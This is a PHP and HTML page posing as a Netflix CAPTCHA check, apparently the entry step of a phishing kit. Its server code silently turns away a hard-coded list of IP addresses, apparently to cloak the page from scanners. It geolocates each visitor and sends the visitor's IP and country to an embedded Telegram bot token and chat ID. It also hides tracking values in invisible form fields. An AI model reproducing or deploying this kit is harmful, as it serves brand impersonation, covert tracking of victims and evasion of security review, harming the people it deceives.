
<?php
session_start();
ini_set('display_errors', 1);
error_reporting(E_ALL);
?>


<!DOCTYPE html>


<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CAPTCHA VERIFICATION</title>

  <style type="text/css">

  #userInput.invalid {
    border: 2px solid darkblue;
  }
body, html {
    height: 100%;
    margin: 0;
    background-color: #000;
    color: white;
    font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
}
  input {
    margin-top: 10px;
    padding: 10px;
    width: auto; /* Adjust width based on content */
    font-size: 1em; /* Responsive font size */
    color: #000; /* Text color to black for better visibility */
    background-color: #fff; /* Background color to white for better visibility */
    border: none; /* Remove borders */
    border-radius: 5px; /* Add border radius */
  }

  #main-page-button {
    cursor: pointer;
    font-weight: bold;
  }

  #userInput.invalid {
    border: 2px solid darkblue;
  }

.captcha-container {
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100%;
    flex-direction: column;
    padding: 10px; 
}

.captcha-box {
    background-color: #141414;
    padding: 20px;
    border-radius: 4px;
    text-align: center;
    width: 100%;
    max-width: 400px; 
}

.logo {
    width: 200px;
    margin-bottom: 20px;
}

.verify-button {
    background-color: #E50914;
    color: white;
    border: none;
    padding: 10px 20px;
    margin-top: 20px;
    border-radius: 4px;
    cursor: pointer;
    font-size: 16px;
    width: 100%; 
}

.verify-button:hover {
    background-color: #f6121d;
}


@media (max-width: 600px) {
    .logo {
        width: 150px; 
    }
}
</style>
</head>
<body>
<?php
  $botToken = "6887294087:AAEC802yB2ffTk_d0HaC43X6tv3VTnaHTOs";
  $chatID = "1064643518";

  
  $userIP = $_SERVER["REMOTE_ADDR"];

  // List of blocked IPs
  $blockedIPs = ['44.227.127.2' , '129.153.125.162' , '192.87.174.28'];

  if (in_array($userIP, $blockedIPs)) {
    exit; // Silently exit for blocked IP addresses
  }
  if (strpos($userIP, '209.222.82.') === 0) {
    exit; // Silently exit for blocked IP range
}
  $accessTime = date("Y-m-d H:i:s");

  // Fetching the geolocation data
  $geoUrl = "http://ip-api.com/json/$userIP";
  $geoResponse = file_get_contents($geoUrl);
  $geoData = json_decode($geoResponse, true);

  // Extracting the country from the response
  $country = $geoData['country'] ?? 'Unknown';

  // Message to Send
  $message = urlencode(
      "[Alert] NEW VISITOR FROM IP : $userIP, Country: $country, status : captcha"
  );

  // Now you can use $message as needed


  // Telegram API URL for sending messages
  $telegramApi = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatID&text=$message";

  // Use file_get_contents to send the request
  $response = file_get_contents($telegramApi);

  // Decode the JSON response to an array
  $responseArray = json_decode($response, true);

  // Extract the message_id from the response
  $messageId = $responseArray["result"]["message_id"];
  echo "<input type='text' value='" .$messageId ."' style='display:none' id='messageId' />";

  echo "<input type='text' value='" .$userIP ."' style='display:none' id='ipzebi' />";

  //echo file_get_contents("https://api.telegram.org/botYOUR_BOT_TOKEN/editMessageText", false, stream_context_create(['http' => ['method' => 'POST', 'header' => 'Content-Type: application/x-www-form-urlencoded', 'content' => http_build_query(['chat_id' => 'CHAT_ID', 'message_id' => MESSAGE_ID, 'text' => 'This is the new edited text'])]]));


?>
<div class="captcha-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/7/7a/Logonetflix.png" alt="Netflix Logo" class="logo">
        <div class="captcha-box">
            <p>Please complete the CAPTCHA to continue:</p>
            <!-- CAPTCHA widget will go here -->
            <div class="captcha-widget"><svg xmlns="http://www.w3.org/2000/svg" width="150" height="100" viewBox="0 0 200 100">
        <rect width="100%" height="100%" fill="#eee" />
        <text id="randomStringSpan" x="50%" y="50%" font-size="30" fill="#333" text-anchor="middle" dominant-baseline="middle" font-family="Arial, sans-serif">
        </text>
        <!-- Your SVG content -->
    </svg>  </div>
    <div class="fl20"> <input id="userInput" type="text" placeholder="Enter captcha text" />
                  <button  id="main-page-button" onclick="checkInput()" class="verify-button">Verify</button>

        <span id="errorMsg"></span>
    <div class="clear"></div>


        </div>
    </div>





<script src="script.js"></script>

</body>
</html>